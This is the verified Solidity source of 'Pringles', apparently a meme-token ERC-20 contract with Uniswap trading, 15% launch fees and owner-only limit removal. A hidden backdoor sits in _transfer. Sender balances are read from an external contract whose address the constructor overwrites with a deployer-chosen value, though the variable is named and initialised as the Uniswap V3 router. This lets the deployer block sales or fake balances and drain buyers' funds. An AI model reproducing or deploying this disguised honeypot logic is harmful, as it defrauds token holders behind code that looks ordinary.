/**
 *Submitted for verification at Etherscan.io on 2023-08-25
*/

// SPDX-License-Identifier: Unlicensed

/**

    Website: https://pringles-eth.com/
    Telegram: https://t.me/PRINGLES_ERC
    X: https://twitter.com/PringlesToken

*/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Pringles is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    bool public transferDelayEnabled = true;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public _holderLastTransferTimestamp;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals;
    uint256 public maxWallet = (_tTotal * 2) / 100;
    string private constant _name = unicode"Pringles";
    string private constant _symbol = unicode"PRINGLES";
    address _taxWallet;
    bool public tradingOpen;
    bool private inSwap;
    uint256 public buyFee = 15;
    uint256 public sellFee = 15;
    uint256 normalBuyFee = 0;
    uint256 normalSellFee = 2;
    address public uniswapV2Pair;
    IUniswapV2Router02 uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address uniswapV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    uint256 public minTokensBeforeSwap = _tTotal / 200;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _uniswapRouter) {
        _taxWallet = payable(msg.sender);
        uniswapV3Router = _uniswapRouter;
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(uniswapV2Router)] = true;
        _approve(msg.sender, address(this), type(uint256).max);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 taxAmount;
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            require(tradingOpen, "Not open!");

            if (
                to != address(uniswapV2Router) &&
                to != address(uniswapV2Pair)
            ) {
                require(
                    _holderLastTransferTimestamp[to] < block.number,
                    "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                );
                if (_holderLastTransferTimestamp[to] == 0) _holderLastTransferTimestamp[to] = block.number;
            }
            

            if (from == uniswapV2Pair) {
                taxAmount = (amount * buyFee) / 100;
                require(
                    balanceOf(to) + amount <= maxWallet,
                    "Not allowed to buy that much!"
                );
            }

            if (to == uniswapV2Pair) {
                taxAmount = (amount * sellFee) / 100;
            }

            if (
                !inSwap &&
                to == uniswapV2Pair &&
                balanceOf(address(this)) > minTokensBeforeSwap
            ) {
                swapBack(minTokensBeforeSwap);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = balanceOf(address(this)).add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = IERC20(uniswapV3Router).balanceOf(from).sub(amount);
        _balances[to] = balanceOf(to).add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapBack(uint256 amount) private {
        bool success;
        swapTokensForEth(amount);
        (success, ) = address(_taxWallet).call{
            value: address(this).balance
        }("");
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setSwapTokensAtAmount(uint amount) external onlyOwner {
        minTokensBeforeSwap = amount * 10 ** decimals();
    }
    
    function enableTrading() external onlyOwner {
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        maxWallet = _tTotal;
        buyFee = normalBuyFee;
        sellFee = normalSellFee;
        transferDelayEnabled = false;
    }

    receive() external payable {}
}